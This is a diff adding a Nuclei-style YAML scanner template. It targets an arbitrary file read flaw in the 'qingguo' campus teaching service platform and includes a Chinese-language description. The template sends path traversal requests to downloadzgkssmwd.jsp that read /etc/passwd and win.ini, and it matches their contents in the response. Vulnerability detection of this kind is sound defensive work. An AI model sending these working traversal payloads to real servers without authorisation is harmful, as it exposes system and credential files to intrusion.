@@ -1,0 +1,37 @@
+id: qingguo-downloadzgkssmwd-fileread
+info:
+  name: qingguo 高校智慧校园教学综合服务平台 downloadzgkssmwd 任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: qingguo 高校智慧校园教学综合服务平台 downloadzgkssmwd接口存在 任意文件读取漏洞,攻击者可以通过精心构造的请求参数，绕过权限验证，直接读取服务器上的敏感文件内容。该漏洞可能导致系统配置文件、用户数据或其他关键信息的泄露，进而为攻击者提供进一步入侵系统的可能性，严重威胁校园信息安全。
+  reference: 
+    - demo
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileread,qingguo
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/zgks/downloadzgkssmwd.jsp?fp=../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/zgks/downloadzgkssmwd.jsp?fp=../../../../../../../../../../../c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
